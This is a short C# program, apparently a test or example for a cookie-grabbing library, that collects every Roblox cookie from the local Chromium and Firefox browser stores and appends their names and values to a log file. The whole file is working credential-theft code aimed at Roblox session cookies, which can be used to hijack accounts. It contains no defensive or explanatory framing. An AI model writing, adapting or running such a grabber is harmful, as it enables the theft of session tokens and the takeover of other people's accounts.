namespace CockyGrabberTest
{
    // This Program grabs all Roblox Cookies that could be found and saves them in a log file
    class Program
    {
        private const string LogFilePath = "LOG FILE PATH HERE.txt";

        static void Main(string[] args)
        {
            UniversalGrabber g = new UniversalGrabber(); // Create Grabber

            List<string> cookies = new List<string>()
            {
                $"==========================================================================================",
                $"NEW LOG STARTED AT {DateTimeOffset.Now}:",
                "",
            };

            // Grab cookies and store the URLs, Usernames and Passwords in 'cookies'
            foreach (Chromium.Cookie c in g.GetAllChromiumCookiesBy(Chromium.CookieHeader.host_key, ".roblox.com"))
            {
                cookies.Add($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}");
            }
            foreach (Firefox.Cookie c in g.FG.GetCookiesBy(Firefox.CookieHeader.host, ".roblox.com"))
            {
                cookies.Add($"Host: {c.Host} | Name: {c.Name} | Value: {c.Value}");
            }

            File.AppendAllLines(LogFilePath, cookies); // Append the grabbed Cookies to the log file
        }
    }
}